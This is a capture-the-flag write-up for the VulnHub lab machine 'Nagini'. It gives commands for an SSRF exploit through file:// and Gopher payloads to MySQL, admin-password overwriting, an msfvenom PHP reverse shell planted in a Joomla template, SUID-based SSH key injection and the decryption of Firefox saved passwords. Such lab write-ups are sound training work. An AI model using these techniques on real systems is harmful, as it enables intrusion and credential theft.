# HarryPotter: Nagini — Penetration Testing Writeup

**Platform:** VulnHub  
**Series:** HarryPotter (Box 2 of 3)  
**Difficulty:** Medium  
**Objective:** Find 3 Horcruxes and achieve root access

---

## Environment Setup

Nagini was imported into VirtualBox via File → Import Appliance. Both the Nagini VM and Kali Linux VM were placed on a Host-Only network to allow communication between them.

---

## Step 1 — Host Discovery & Initial Port Scan

Performed a ping sweep to identify live hosts on the network, then ran a quick nmap scan to confirm open ports on the target:

```bash
nmap -sn 192.168.56.0/24
nmap 192.168.56.103
```

Target identified at `192.168.56.103` with ports 22 (SSH) and 80 (HTTP) open.

<img width="1138" height="415" alt="IntialScans" src="https://github.com/user-attachments/assets/22539772-9a17-4c1d-954a-68cf69aac5d2" />

---

## Step 2 — In-Depth Port Scan

Ran a full service and script scan to identify versions and gather more detail:

```bash
nmap -sC -sV 192.168.56.103
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    Apache httpd 2.4.38 (Debian)
```

Visiting the web server in the browser revealed a Harry Potter image with nothing useful in the source code. SSH is not useful without credentials, so the web server on port 80 is the primary attack surface.

<img width="1899" height="889" alt="indepthportscanandsite" src="https://github.com/user-attachments/assets/6f006707-a3d2-4bfa-adff-fef6cc529de3" />

---

## Step 3 — Web Enumeration with Gobuster

Ran Gobuster to find hidden directories and files:

```bash
gobuster dir -u http://192.168.56.103 -x html,txt,php -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/joomla` — redirecting to a Joomla CMS installation
- `/note.txt` — a note left by the site admin

<img width="1395" height="786" alt="gobuster" src="https://github.com/user-attachments/assets/524826ab-f93c-44f1-a5b9-894b3300aec8" />


Visiting `/joomla` revealed a Joomla CMS login page:

<img width="1259" height="706" alt="joomlacms" src="https://github.com/user-attachments/assets/f37c80b9-97f8-4729-b764-cd1835183810" />


Visiting `/note.txt` revealed the following message:

<img width="773" height="166" alt="notetxt" src="https://github.com/user-attachments/assets/c4650fc8-e87b-454b-b5e3-ded6c2082455" />


The note revealed the existence of an HTTP3 server at `quic.nagini.hogwarts`. Attempting to visit this in a standard browser failed — HTTP3 (QUIC protocol) is not natively supported:

<img width="1277" height="821" alt="http3serverunavaiilable" src="https://github.com/user-attachments/assets/f40cee40-4a6f-48cc-bd9f-1794cc3fb090" />

---

## Step 4 — Adding Host Entry & Accessing HTTP3

Added `quic.nagini.hogwarts` to `/etc/hosts` so the machine could resolve the hostname, and confirmed the HTTP3 site resolves correctly after the entry was added:

```bash
echo "192.168.56.103 nagini.hogwarts quic.nagini.hogwarts" | sudo tee -a /etc/hosts
```

<img width="1882" height="925" alt="hostfile" src="https://github.com/user-attachments/assets/e8cc1b84-0bba-417e-8477-127e5f25ff14" />

Used curl with `--http3` to fetch the page content since standard browsers don't support QUIC:

```bash
curl --http3 http://quic.nagini.hogwarts/
```

<img width="1511" height="607" alt="http3curl" src="https://github.com/user-attachments/assets/821d264c-6781-4be6-bad0-6e749600af5f" />

The HTTP3 page returned only the same Harry Potter image source — no new leads. Enumeration continued on the main HTTP server.

---

## Step 5 — Further Gobuster Enumeration

Attempted larger wordlists to find additional files on the web server root. Standard wordlists returned the same results as before:

<img width="1167" height="692" alt="gobusterscan" src="https://github.com/user-attachments/assets/a60b3349-de8e-4873-be43-1bcd69c4bb3e" />

Tried the dirbuster medium wordlist and SecLists raft-large-files — still no new findings:

<img width="1226" height="761" alt="InconclusiveScan" src="https://github.com/user-attachments/assets/957414d5-5d5a-49ce-8c7b-3901056ee115" />

<img width="1406" height="928" alt="incoclusivescan2" src="https://github.com/user-attachments/assets/33fa0824-e954-4f5b-9edf-4b6d165a93f9" />

> **Key lesson:** The file `internalResourceFeTcher.php` (note the capital T) cannot be found by standard wordlists as it is a custom, uniquely named file. This highlights why wordlist-based enumeration has limits and must be combined with CMS-specific scanners, context clues, and manual guessing.

---

## Step 6 — Joomscan & Configuration Backup Discovery

Since Joomla was identified on the target, ran `joomscan` for CMS-specific enumeration:

```bash
joomscan -u http://192.168.56.103/joomla
```

Joomscan found a sensitive backup configuration file at `http://192.168.56.103/joomla/configuration.php.bak`:

<img width="1226" height="825" alt="joomscan" src="https://github.com/user-attachments/assets/53c40dc8-fe27-4121-a411-8803a22ac6b2" />

Downloaded and read the backup file:

```bash
curl http://192.168.56.103/joomla/configuration.php.bak
```

<img width="1899" height="908" alt="cr" src="https://github.com/user-attachments/assets/01b89179-4397-4d76-8351-5a336edd76cc" />

<img width="1819" height="909" alt="credentials" src="https://github.com/user-attachments/assets/687b95f6-268b-4d42-a14f-d58d52590441" />

**Credentials extracted:**

```
DB user:     goblin
DB password: (empty)
DB name:     joomla
DB host:     localhost
Admin email: site_admin@nagini.hogwarts
```

> **Note:** `configuration.php` returns blank when visited directly because Apache executes it as PHP. The `.bak` file bypasses this since Apache serves it as plain text — a common misconfiguration.

---

## Step 7 — Failed Direct MySQL Connection

Attempted to connect directly to MySQL from Kali using the extracted credentials:

```bash
mysql -h 192.168.56.103 -u goblin -p
```

Connection refused — MySQL is bound to localhost only and is not exposed externally:

<img width="802" height="89" alt="failedsqlattempt" src="https://github.com/user-attachments/assets/4de7aa7c-fabd-45a4-aa0d-dd637a728d3e" />

A different approach is needed to interact with the database.

---

## Step 8 — Discovering the SSRF Endpoint

By attempting the filename directly on the root web server — informed by the understanding that this box had an internal resource fetching utility — discovered `internalResourceFeTcher.php`:

```bash
curl http://192.168.56.103/internalResourceFeTcher.php
```

The page contained a URL input field with parameter name `url` using GET method — a classic SSRF entry point:

<img width="928" height="347" alt="internalresourcefetcher" src="https://github.com/user-attachments/assets/2acf52c9-e2cf-4e58-8bc3-d1c7d264cb5d" />

---

## Step 9 — SSRF Exploitation via file:// Protocol

Tested for SSRF by reading `/etc/passwd` using the `file://` scheme:

```bash
curl "http://192.168.56.103/internalResourceFeTcher.php?url=file:///etc/passwd"
```

The server returned the full contents of `/etc/passwd`, confirming the SSRF vulnerability. Key users identified: `snape`, `ron`, `hermoine`, and `mysql`.

<img width="1287" height="836" alt="SSRF" src="https://github.com/user-attachments/assets/89e4546b-20e4-4944-8ee8-b57adc7c57b7" />

---

## Step 10 — MySQL Exploitation via Gopher + SSRF

Since MySQL was only accessible from localhost, used **Gopherus** to craft Gopher protocol payloads that the SSRF fetcher would deliver to MySQL on our behalf.

```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
python2 gopherus.py --exploit mysql
```

### Listing Joomla Tables

Generated a payload with MySQL user `goblin` and query `use joomla; show tables;`. Pasted the generated Gopher URL into the fetcher's input field via the browser. The response confirmed a `joomla_users` table existed:

<img width="1920" height="928" alt="fetched" src="https://github.com/user-attachments/assets/70f8139d-edf7-4c07-9f70-0150bbcb1258" />

### Dumping joomla_users

Generated a new Gopherus payload with query `use joomla; select * from joomla_users;` and submitted via browser:

<img width="1917" height="513" alt="joomlatables" src="https://github.com/user-attachments/assets/bb2f8ed3-4c9f-4f95-bcc2-c8fc1e930583" />


Response revealed:

```
Username: site_admin
Email:    site_admin@nagini.hogwarts
Hash:     $2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay0
```

### Replacing the Admin Password

The hash was bcrypt (`$2y$`) — computationally expensive to crack. Instead, generated a Gopherus payload to replace it with a known MD5 hash for `password1234` (`bdc87b9c894da5168059e00ebffb9077`):

```
use joomla; update joomla_users set password='bdc87b9c894da5168059e00ebffb9077' where username='site_admin';
```

<img width="1899" height="662" alt="NewPayload" src="https://github.com/user-attachments/assets/690024c3-ecf4-40bf-ae4e-c19c3c7263b3" />

Submitted via browser. Password successfully updated.

---

## Step 11 — Joomla Admin Access

Navigated to `http://192.168.56.103/joomla/administrator` and logged in with `site_admin` / `password1234`:

<img width="1910" height="934" alt="adminsignin" src="https://github.com/user-attachments/assets/cf39a7d1-1297-415f-9614-d39613e0b93d" />

<img width="1910" height="813" alt="SignedIN" src="https://github.com/user-attachments/assets/a3ac4590-c274-4dbc-9463-9c92cce69cc5" />

---

## Step 12 — Remote Code Execution via Template Editor

Generated a PHP meterpreter reverse shell payload using msfvenom:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw
```

<img width="1568" height="762" alt="msfvenom" src="https://github.com/user-attachments/assets/777c8227-1241-442a-815c-7dd09e6e4e59" />


In the Joomla admin panel, navigated to **Extensions → Templates → Templates**, selected the active template (protostar), opened `index.php`, and replaced all existing content with the msfvenom payload, then saved:

<img width="1917" height="791" alt="pastepayloadjoomla" src="https://github.com/user-attachments/assets/1ad34427-7884-4a62-b468-6e585c2911b2" />

Started the Metasploit listener and triggered the payload by visiting `http://192.168.56.103/joomla/index.php`:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; run"
```

Meterpreter session opened successfully as `www-data`:

<img width="1918" height="794" alt="payloadsuccess" src="https://github.com/user-attachments/assets/5cff7854-76f5-47a9-bac3-8e38df1f8061" />

---

## Step 13 — Shell Stabilization & Credential Discovery

Dropped into a shell and stabilized it:

```bash
shell
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

<img width="1877" height="789" alt="gettiingintobash" src="https://github.com/user-attachments/assets/cc362bb4-39fc-4417-aa81-f18aa4f5a447" />

Navigated to snape's home directory and used `ls -la` to reveal hidden files. Found `.creds.txt` containing a base64 encoded password:

```bash
cd /home/snape
ls -la
cat .creds.txt | base64 -d
```

Decoded password: `Love@lilly`

<img width="1354" height="733" alt="gotcredentials" src="https://github.com/user-attachments/assets/a076d6a3-c512-4171-84f2-ebca5e992606" />

---

## Step 14 — Privilege Escalation: www-data → snape

SSH'd into the box as snape using the decoded password:

```bash
ssh snape@192.168.56.103
```

<img width="1186" height="528" alt="sshsnape" src="https://github.com/user-attachments/assets/04f349e1-09ec-477b-ac88-c6d014ffcc5f" />

---

## Step 15 — Privilege Escalation: snape → hermoine

On Kali, generated SSH keys and served the public key via a Python HTTP server:

```bash
ssh-keygen -t rsa
cd ~/.ssh
python3 -m http.server 80
```

<img width="1795" height="775" alt="newsshkeys" src="https://github.com/user-attachments/assets/3a9165f6-b9c6-47c8-9b19-4d3d332e6266" />

As snape on the target, searched for SUID binaries:

```bash
find / -perm -u=s 2>/dev/null
```

Found a non-standard SUID binary at `/home/hermoine/bin/su_cp` — a copy command that executes with hermoine's privileges due to the SUID bit. Downloaded the Kali public key and used `su_cp` to inject it into hermoine's `authorized_keys`:

```bash
wget http://192.168.56.101/id_rsa.pub
/home/hermoine/bin/su_cp id_rsa.pub /home/hermoine/.ssh/authorized_keys
```

<img width="1828" height="727" alt="transfereingsshkeys" src="https://github.com/user-attachments/assets/417817be-92fb-4fd9-af07-875cb7cc609d" />

SSH'd in as hermoine using the private key:

```bash
ssh -i ~/.ssh/id_rsa hermoine@192.168.56.103
```

---

## Step 16 — Horcrux 1 & Horcrux 2

As hermoine, navigated to `/var/www/html` and retrieved the first horcrux, then read the second from hermoine's home directory:

```bash
cat /var/www/html/horcrux1.txt
cat /home/hermoine/horcrux2.txt
```

`horcrux1: horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm95ZWQgYlkgUm90}`

`horcrux2: horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgWlvbmU=}`

<img width="1763" height="686" alt="Firsthorcrux" src="https://github.com/user-attachments/assets/50d09a25-22fa-4206-8c0e-46ddced1b28f" />


<img width="1374" height="598" alt="2ndhorcux" src="https://github.com/user-attachments/assets/718a8b1a-4bb8-4fd0-895c-1a2dca7b490e" />


---

## Step 17 — Privilege Escalation: hermoine → root

Found a `.mozilla` folder in hermoine's home directory. Firefox stores saved passwords encrypted in its profile folder. Copied it to Kali for offline decryption:

```bash
scp -r -i ~/.ssh/id_rsa hermoine@192.168.56.103:/home/hermoine/.mozilla /tmp/nagini/
```

<img width="1460" height="667" alt="mozillafgilecopy" src="https://github.com/user-attachments/assets/71ab2975-4ff2-439e-bc8b-7a4cbc2ecfba" />


Cloned and ran `firefox_decrypt.py` against the copied Firefox profile:

```bash
git clone https://github.com/Unode/firefox_decrypt.git
cd firefox_decrypt
python3 firefox_decrypt.py /tmp/nagini/firefox
```

**Decrypted credentials:**

```
Website:  http://nagini.hogwarts
Username: root
Password: @Alohomora#123
```

<img width="1520" height="620" alt="rootpass" src="https://github.com/user-attachments/assets/d9452a26-5539-4300-ae2f-b5f1920b0d2e" />


SSH'd in as root:

```bash
ssh root@192.168.56.103
```

### Horcrux 3

```bash
cat /root/horcrux3.txt
```

`horcrux3: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgU0dFycnk=}`

<img width="1632" height="760" alt="thirdhorcrux" src="https://github.com/user-attachments/assets/522d9521-af84-47ca-89c5-c2ef15f13b90" />

---

## Summary

| Step | Technique |
|------|-----------|
| Reconnaissance | nmap, gobuster, joomscan |
| Initial foothold | SSRF via `internalResourceFeTcher.php` |
| DB access | Gopher protocol via SSRF → MySQL |
| Admin access | Password hash replacement in `joomla_users` |
| RCE | msfvenom PHP meterpreter via Joomla template editor |
| Privesc 1 | Hidden `.creds.txt` with base64 encoded password |
| Privesc 2 | SUID binary abuse (`su_cp`) → SSH key injection |
| Privesc 3 | Firefox saved password decryption → root SSH |

---

## Key Lessons

- **CMS scanners find what gobuster misses** — `joomscan` found `configuration.php.bak` which revealed database credentials directly
- **Capitalization matters in filenames** — `internalResourceFeTcher.php` with a capital T evades all standard wordlists
- **Always use `ls -la`** — hidden files like `.creds.txt` are invisible without the `-a` flag
- **SSRF + Gopher = database access** — when MySQL is localhost-only, Gopher protocol lets you interact with it through an SSRF vulnerability
- **Unusual SUID binaries are always worth investigating** — anything outside `/usr/bin` or `/usr/lib` is suspicious
- **Browser saved passwords are a goldmine** — Firefox profile folders contain decryptable credentials when you have filesystem access
